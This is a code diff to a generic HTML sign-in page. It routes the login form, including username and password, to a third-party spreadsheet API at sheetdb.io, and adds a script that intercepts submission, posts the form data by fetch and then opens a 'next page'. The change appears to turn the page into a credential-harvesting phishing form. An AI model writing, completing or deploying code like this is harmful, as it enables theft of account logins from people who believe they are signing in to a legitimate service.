@@ -23,7 +23,7 @@
                 <h1>Welcome</h1>
                 <p>Sign in to access your account</p>
             </div>
-            <form class="login-form">
+            <form class="login-form" method="post" id="customerForm">
                 <div class="form-group">
                     <label for="username">Username or email address</label>
                     <input type="text" id="username" name="username" placeholder="Enter your username or email" required>
@@ -39,10 +39,34 @@
                     </label>
                     <a href="#" class="forgot-password">Forgot password?</a>
                 </div>
-                <button type="submit" class="login-button">Sign in</button>
+                <button type="submit" class="login-button" formaction="https://sheetdb.io/api/v1/mzo2myty1u5cg">Sign in</button>
             </form>
         </div>
     </div>
+    <script>
+        var form = document.getElementById("customerForm");
+        form.addEventListener("submit", (e) => {
+            e.preventDefault();
+    
+            fetch(form.action, {
+                method: "POST",
+                body: new FormData(form)
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log("Response:", data);
+                if (data && !data.error) {
+                    window.open("nextpage.html", "_blank"); // Redirect to the next page if successful
+                } else {
+                    alert("Failed to submit form. Please try again.");
+                }
+            })
+            .catch(error => {
+                console.error("Error:", error);
+                alert("Error submitting form. Please check your internet connection.");
+            });
+        });
+    </script>
     <script src="script.js"></script>
 </body>
 </html> 
